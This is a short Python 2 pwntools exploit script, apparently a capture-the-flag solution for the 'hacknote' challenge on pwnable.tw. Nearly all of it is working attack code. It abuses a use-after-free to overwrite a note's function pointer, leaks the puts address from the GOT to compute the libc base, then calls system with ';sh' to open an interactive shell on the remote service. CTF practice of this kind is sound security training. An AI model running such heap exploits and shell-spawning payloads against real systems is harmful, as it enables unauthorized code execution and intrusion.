```python
#!/usr/bin/env python2
#-*-coding:utf8-*-

from pwn import *

#context.log_level = 'debug'
IP = 'chall.pwnable.tw'
PORT = '10102'
r = remote(IP, PORT)
#r = process('./hacknote')
e = ELF('./hacknote')
#libc = e.libc
libc = ELF('libc_32.so.6')

sub_804862B = 0x804862B
puts_got = e.got['puts']

def add_note(size, idx):
    r.sendlineafter(':', str(1))
    r.sendlineafter(':', str(size))
    r.sendlineafter(':', str(idx))

def delete_note(idx):
    r.sendlineafter(':', str(2))
    r.sendlineafter(':', str(idx))

def print_note(idx):
    r.sendlineafter(':', str(3))
    r.sendlineafter(':', str(idx))

add_note(100, '')
add_note(100, '')
delete_note(0)
delete_note(1)
add_note(8, p32(sub_804862B) + p32(puts_got))
print_note(0)

puts_leak = u32(r.recvuntil('\xf7')[-4:])
base = puts_leak - libc.symbols['puts']
system = base + libc.symbols['system']

info('puts leak : {}'.format(hex(puts_leak)))
info('base addr : {}'.format(hex(base)))
info('system addr : {}'.format(hex(system)))

delete_note(2)
add_note(8, p32(system) + ';sh')
print_note(0)
r.interactive()
```
